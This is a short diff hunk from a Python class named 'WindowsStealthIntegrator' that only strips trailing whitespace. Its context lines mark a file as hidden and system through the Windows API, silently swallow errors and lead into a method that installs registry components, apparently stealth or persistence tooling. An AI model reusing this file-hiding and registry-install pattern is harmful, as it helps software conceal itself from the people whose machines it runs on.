@@ -87,7 +87,7 @@ class WindowsStealthIntegrator:
         try:
             ctypes.windll.kernel32.SetFileAttributesW(str(file_path), 6)
    
-        except: 
+        except:
             pass
 
     def _install_registry_components(self, data: Dict[str, Any]):
